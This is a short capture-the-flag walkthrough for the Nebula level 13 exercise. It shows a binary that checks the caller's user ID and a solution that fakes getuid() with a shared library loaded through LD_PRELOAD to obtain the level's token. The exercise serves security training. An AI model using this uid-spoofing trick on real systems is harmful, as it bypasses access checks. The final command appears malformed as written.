.. _nebula13:

.. role:: bash(code)
	  :language: bash

.. role:: c(code)
	  :language: c
	       
Nebula level 13
===============

Basic information
-----------------

**Home Page:** https://exploit-exercises.com/nebula/level00/

**Source Code**

.. code-block:: c

		#include <stdlib.h>
		#include <unistd.h>
		#include <stdio.h>
		#include <sys/types.h>
		#include <string.h>

		#define FAKEUID 1000

		int main(int argc, char **argv, char **envp)
		{
		    int c;
		    char token[256];

		    if(getuid() != FAKEUID) {
		        printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
			printf("The system administrators will be notified of this violation\n");
			exit(EXIT_FAILURE);
		    }

		    // snip, sorry :)

		    printf("your token is %s\n", token);

		}

To solve this level we will use LD_PRELOAD

First create a C file

.. code-block:: c

		int getuid() {
		    return 1000;
		}

Then compile it as a shared library

:bash:`gcc -shared -fPIC -o /home/level13/fake.so /home/level13/fake.c`

Load the created library on LD_PRELOAD
      
:bash:`cp /home/flag13/flag13 /home/level13/flag13`

Finally run

:bash:`export LD_PRELOAD=/home/level13/fake.so /home/level13/flag13`
